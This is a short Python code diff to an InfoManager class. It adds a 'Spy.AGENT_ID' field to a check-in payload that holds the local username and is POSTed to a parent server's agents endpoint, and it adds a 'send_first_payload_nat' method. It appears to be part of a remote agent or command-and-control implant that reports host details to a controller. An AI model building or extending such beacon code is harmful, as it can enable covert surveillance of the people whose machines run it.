@@ -21,9 +21,15 @@ class InfoManager:
                     "abi": ABI,
                     "version": VERSION,
                     "tasks": BaseJob.get_available_tasks(),
-                    "user": getpass.getuser()
+                    "user": getpass.getuser(),
+                    "agent_id": Spy.AGENT_ID,
                 }
             )
             _, status = await HTTPManager.send_json(url=f"{PARENT_URL}/api/v1/agents/backward", data=information)
             if status == 200:
                 break
+
+
+    @classmethod
+    async def send_first_payload_nat(cls):
+        return await AgentManager.send_first_payload_nat()
